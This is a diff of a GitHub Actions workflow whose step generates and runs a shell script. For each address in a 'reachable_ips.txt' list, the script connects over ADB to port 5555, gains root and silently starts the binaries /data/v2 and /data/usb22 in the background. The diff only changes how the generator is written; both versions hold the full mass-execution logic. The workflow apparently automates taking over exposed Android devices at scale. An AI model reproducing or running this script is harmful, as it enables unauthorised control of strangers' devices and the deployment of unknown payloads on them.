@@ -65,24 +65,26 @@ jobs:
 
     - name: Generate ADB commands with Python
       run: |
-        python3 -c '
-        import os
+        # 创建 Python 脚本
+        echo 'import os' > 33.py
+        echo '' >> 33.py
+        echo 'def generate_adb_commands(ip_file, output_file):' >> 33.py
+        echo '    with open(ip_file, "r") as infile, open(output_file, "w") as outfile:' >> 33.py
+        echo '        for line in infile:' >> 33.py
+        echo '            ip = line.strip()' >> 33.py
+        echo '            if ip:' >> 33.py
+        echo '                outfile.write(f"adb connect \\"{ip}:5555\\"\n")' >> 33.py
+        echo '                outfile.write("adb root\n")' >> 33.py
+        echo '                outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/v2 run > /dev/null 2> /data/error.log &\\"\'\n")' >> 33.py
+        echo '                outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\\"\'\n")' >> 33.py
+        echo '                outfile.write(f"adb disconnect \\"{ip}:5555\\"\n")' >> 33.py
+        echo '                outfile.write("\n")' >> 33.py
+        echo '' >> 33.py
+        echo 'if __name__ == "__main__":' >> 33.py
+        echo '    generate_adb_commands("reachable_ips.txt", "t.sh")' >> 33.py
 
-  def generate_adb_commands(ip_file, output_file):
-      with open(ip_file, "r") as infile, open(output_file, "w") as outfile:
-          for line in infile:
-              ip = line.strip()
-              if ip:
-                  outfile.write(f"adb connect \\"{ip}:5555\\"\n")
-                  outfile.write("adb root\n")
-                  outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/v2 run > /dev/null 2> /data/error.log &\\"\'\n")
-                  outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\\"\'\n")
-                  outfile.write(f"adb disconnect \\"{ip}:5555\\"\n")
-                  outfile.write("\n")
-
-  if __name__ == "__main__":
-      generate_adb_commands("reachable_ips.txt", "t.sh")
-        '
+        # 执行 Python 脚本生成 t.sh
+        python3 33.py
 
         # 执行生成的 t.sh 脚本
         bash t.sh
